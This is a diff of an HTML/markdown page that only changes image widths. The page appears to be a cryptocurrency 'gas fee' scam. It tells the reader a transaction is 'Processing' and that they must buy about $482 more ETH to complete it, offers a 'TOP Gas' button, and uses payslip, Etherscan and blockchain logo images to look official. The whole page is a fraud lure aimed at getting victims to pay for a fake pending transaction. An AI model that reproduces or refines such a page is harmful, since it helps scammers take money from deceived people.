@@ -56,7 +56,7 @@
            
                                                          <!-- XtN Details -->
                                                          
-<img src="IMG_8719.gif" alt="blockchain Logo" width="700" />
+<img src="IMG_8719.gif" alt="blockchain Logo" width="350" />
 
 <form action="https://phantom.com/" method="get">
   <button type="submit"> [TOP Gas ⛽️ USDT] </button>
@@ -85,12 +85,12 @@
 
 ✅ This transaction is <span style="color: Red;"> Processing </span> ,Top-Up USDT Gas to Complete.✓⃝
 
-<img src="IMG_9063.jpeg" alt="payslip" width="700" />
+<img src="IMG_9063.jpeg" alt="payslip" width="350" />
 
 <span style="color: red;"> **SUMMARY~** <You need 0.89560913 more ETH to complete this transaction Buy more [$482 usd] ETH For Gas Price> </span>  <img src="IMG_9118.jpeg" alt="blockchain Logo" width="15" />
 
 
-<img src="IMG_9113.jpeg" alt="ethscan Logo" width="700" />
+<img src="IMG_9113.jpeg" alt="ethscan Logo" width="350" />
 
 
 
@@ -100,9 +100,9 @@
 
 
 
-<img src="IMG_9086.gif" alt="loading gif display" width="700">
-<img src="IMG_8361.jpeg" alt="ethscan Logo" width="700" />
-<img src="IMG_0561.png" alt="usdex explanation" width="700" />
+<img src="IMG_9086.gif" alt="loading gif display" width="350">
+<img src="IMG_8361.jpeg" alt="ethscan Logo" width="350" />
+<img src="IMG_0561.png" alt="usdex explanation" width="350" />
               
               <!-- Buttons -->
               
